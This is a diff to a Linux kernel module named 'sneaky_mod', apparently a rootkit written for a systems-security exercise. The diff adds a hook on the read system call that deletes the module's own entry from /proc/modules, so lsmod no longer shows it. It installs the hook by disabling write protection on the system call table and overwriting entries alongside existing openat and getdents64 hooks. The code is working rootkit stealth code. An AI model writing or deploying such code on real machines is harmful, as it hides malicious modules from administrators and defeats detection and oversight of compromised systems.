@@ -88,6 +88,27 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 
 
 
+/*----------------------------read-----------------------------*/
+// 4. hide the fact that the sneaky_module itself is an installed kernel module
+// The list of active kernel modules is stored in the /proc/modules file
+// remove the contents of the line for “sneaky_mod” from the buffer of read data being returned
+// “lsmod” should return a listing of all modules except for the “sneaky_mod”
+asmlinkage ssize_t (*original_read)(struct pt_regs*);
+
+asmlinkage ssize_t sneaky_read(struct pt_regs *regs){
+  ssize_t bytesRead = original_read(regs);
+  void* lineStart = strstr((char*)(regs->si), "sneaky_mod");
+  if (lineStart != NULL) {
+    void* lineEnd = strchr(lineStart, '\n');
+    if(lineEnd !=NULL){
+      lineEnd++;
+      memmove(lineStart, lineEnd, ((void*)(regs->si) + bytesRead) - lineEnd);
+      bytesRead -= lineEnd - lineStart;
+    }
+  }
+  return (ssize_t)bytesRead;
+}
+
 /*----------------------------initialize & exit-----------------------------*/
 
 // The code that gets executed when the module is loaded
@@ -105,13 +126,15 @@ static int initialize_sneaky_module(void)
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
   original_getdents64 = (void*)sys_call_table[__NR_getdents64];
+  original_read = (void*)sys_call_table[__NR_read];
 
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
   
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
-  
+  sys_call_table[__NR_read] = (unsigned long)sneaky_read;
+
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
 
@@ -130,6 +153,7 @@ static void exit_sneaky_module(void)
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
+  sys_call_table[__NR_read] = (unsigned long)original_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
